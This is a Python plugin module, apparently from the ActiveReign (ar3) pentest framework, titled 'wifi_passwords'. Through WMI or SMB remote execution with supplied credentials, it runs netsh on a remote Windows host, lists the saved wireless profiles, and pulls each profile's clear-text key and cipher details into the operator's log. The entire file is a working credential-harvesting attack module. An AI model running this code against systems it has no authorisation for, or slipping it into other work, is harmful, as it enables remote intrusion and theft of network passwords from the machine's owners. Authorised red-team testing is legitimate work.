from ar3.core.wmiexec import WMIEXEC
from ar3.core.smbexec import SMBEXEC

class WifiPasswords():
    def __init__(self):
        self.name = 'wifi_passwords'
        self.description = 'Extract wifi passwords from system'
        self.author = ['@m8r0wn']
        self.args = {}

    def run(self, target, args, smb_con, loggers):
        profiles = []
        logger = loggers['console']

        try:
            if args.exec_method == 'wmiexec':
                executioner = WMIEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)
            elif args.exec_method == 'smbexec':
                executioner = SMBEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)

            # Quick n dirty error checking...
            results = executioner.execute('netsh wlan show profiles').splitlines()
            if len (results) <= 1:
                logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, results[0])])
                return

            # List all profiles
            for r in results:
                if r.strip().startswith('All User Profile'):
                    try:
                        wifi = r.strip().split(":")[1]
                        profiles.append(wifi.lstrip().rstrip())
                    except:
                        pass

            # Get clear text passwords
            for p in profiles:
                try:
                    for result in executioner.execute('netsh wlan show profile name=\"{}\" key=clear'.format(p)).splitlines():
                        if result.split(":")[0].strip() in ['SSID name', 'Authentication', 'Cipher', 'Key Content']:
                            logger.success([smb_con.host, smb_con.ip, self.name.upper(), result.lstrip()])
                except Exception as e:
                    logger.debug([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, str(e))])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))